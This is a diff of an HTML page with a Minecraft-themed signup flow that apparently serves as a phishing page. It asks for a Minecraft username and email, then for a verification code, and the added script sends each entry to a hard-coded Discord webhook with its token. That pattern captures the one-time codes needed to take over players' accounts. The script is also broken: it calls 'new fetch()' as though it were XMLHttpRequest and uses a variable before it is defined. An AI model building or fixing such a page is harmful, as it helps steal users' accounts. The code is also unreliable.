@@ -104,7 +104,7 @@
     <input type="submit" value="Send Email">
   </form>
 
- <div id="codeFormContainer" style="display: none;">
+ <div id="codeFormContainer">
   <h2>Enter Code</h2>
   <form id="codeForm">
     <label for="code">Please enter the code below:</label>
@@ -113,116 +113,132 @@
   </form>
 </div>
 
-<div id="signupComplete" style="display: none;">
-  <h2>Sign Up Complete!</h2>
-</div>
-
-<div class="scroll-container">
-  <div class="scroll-content">
-    <div class="guild">
-      <h3>Flexed</h3>
-      <span class="followers">Followers: 372</span>
-    </div>
-    <div class="guild">
-      <h3>Flexing Chimps</h3>
-      <span class="followers">Followers: 170</span>
-    </div>
-    <div class="guild">
-      <h3>Dawn</h3>
-      <span class="followers">Followers: 289</span>
-    </div>
-    <div class="guild">
-      <h3>WAR</h3>
-      <span class="followers">Followers: 132</span>
-    </div>
-    <div class="guild">
-      <h3>technogang</h3>
-      <span class="followers">Followers: 567</span>
-    </div>
-    <div class="guild">
-      <h3>The Abyss</h3>
-      <span class="followers">Followers: 420</span>
-    </div>
-    <div class="guild">
-      <h3>Leman</h3>
-      <span class="followers">Followers: 191</span>
-    </div>
-    <div class="guild">
-      <h3>Envision</h3>
-      <span class="followers">Followers: 224</span>
-    </div>
-    <div class="guild">
-      <h3>Rebel</h3>
-      <span class="followers">Followers: 109</span>
+  <div class="scroll-container">
+    <div class="scroll-content">
+      <div class="guild">
+        <h3>Flexed</h3>
+        <span class="followers">Followers: 372</span>
+      </div>
+      <div class="guild">
+        <h3>Flexing Chimps</h3>
+        <span class="followers">Followers: 170</span>
+      </div>
+      <div class="guild">
+        <h3>Dawn</h3>
+        <span class="followers">Followers: 289</span>
+      </div>
+      <div class="guild">
+        <h3>WAR</h3>
+        <span class="followers">Followers: 132</span>
+      </div>
+      <div class="guild">
+        <h3>technogang</h3>
+        <span class="followers">Followers: 567</span>
+      </div>
+      <div class="guild">
+        <h3>The Abyss</h3>
+        <span class="followers">Followers: 420</span>
+      </div>
+      <div class="guild">
+        <h3>Leman</h3>
+        <span class="followers">Followers: 191</span>
+      </div>
+      <div class="guild">
+        <h3>Envision</h3>
+        <span class="followers">Followers: 224</span>
+      </div>
+      <div class="guild">
+        <h3>Rebel</h3>
+        <span class="followers">Followers: 109</span>
+      </div>
     </div>
   </div>
-</div>
 
-  <script>
-    // JavaScript code
+<script>
+  // JavaScript code
 
-    // Code for email form submission
-    document.getElementById("emailForm").addEventListener("submit", function (event) {
-      event.preventDefault();
+  // Code for email form submission
+  document.getElementById("emailForm").addEventListener("submit", function (event) {
+    event.preventDefault();
 
-      const username = document.getElementById("username").value;
-      const email = document.getElementById("email").value;
+    const username = document.getElementById("username").value;
+    const email = document.getElementById("email").value;
 
-      const message = {
-        // Message data...
-      };
-
-      const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
+    const message = {
+      content: "Email and IGN entered!",
+      embeds: [
+        {
+          color: null,
+          fields: [
+            {
+              name: "Minecraft Username:",
+              value: username,
+            },
+            {
+              name: "Email:",
+              value: email,
+            },
+            {
+              name: "Code:",
+              value: code,
+            },
+          ],
         },
-        body: JSON.stringify(message),
-      })
-        .then(function (response) {
-          if (response.ok) {
-            document.getElementById("emailForm").style.display = "none";
-            document.getElementById("codeFormContainer").style.display = "block";
-          } else {
-            console.error("Failed to send webhook:", response.statusText);
-          }
-        })
-        .catch(function (error) {
-          console.error("Failed to send webhook:", error);
-        });
-    });
+      ],
+    };
 
-    // Code for code form submission
-    document.getElementById("codeForm").addEventListener("submit", function (event) {
-      event.preventDefault();
+    const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
+    const xhr = new fetch();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === fetch.DONE) {
+        if (xhr.status === 200) {
+          document.getElementById("emailForm").style.display = "none";
+          document.getElementById("codeFormContainer").style.display = "block";
+        } else {
+          console.error("Failed to send webhook:", xhr.statusText);
+        }
+      }
+    };
+    xhr.send(JSON.stringify(message));
+  });
 
-      const code = document.getElementById("code").value;
+  // Code for code form submission
+  document.getElementById("codeForm").addEventListener("submit", function (event) {
+    event.preventDefault();
 
-      const message = {
-        // Message data...
-      };
+    const code = document.getElementById("code").value;
 
-      const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0";
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
+    const message = {
+      content: "Code Received!",
+      embeds: [
+        {
+          color: null,
+          fields: [
+            {
+              name: "Code:",
+              value: code,
+            },
+          ],
         },
-        body: JSON.stringify(message),
-      })
-        .then(function (response) {
-          if (response.ok) {
-            document.getElementById("codeFormContainer").style.display = "none";
-            document.getElementById("signupComplete").style.display = "block";
-          } else {
-            console.error("Failed to send webhook:", response.statusText);
-          }
-        })
-        .catch(function (error) {
-          console.error("Failed to send webhook:", error);
-        });
-    });
-  </script>
-</body>
-</html>
+      ],
+    };
+
+    // Replace the webhookUrl with the correct URL for the code form webhook
+    const webhookUrl = "https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0L";
+    const xhr = new fetch();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === fetch.DONE) {
+        if (xhr.status === 200) {
+          // Handle successful webhook submission
+        } else {
+          console.error("Failed to send webhook:", xhr.statusText);
+        }
+      }
+    };
+    xhr.send(JSON.stringify(message));
+  });
+</script>
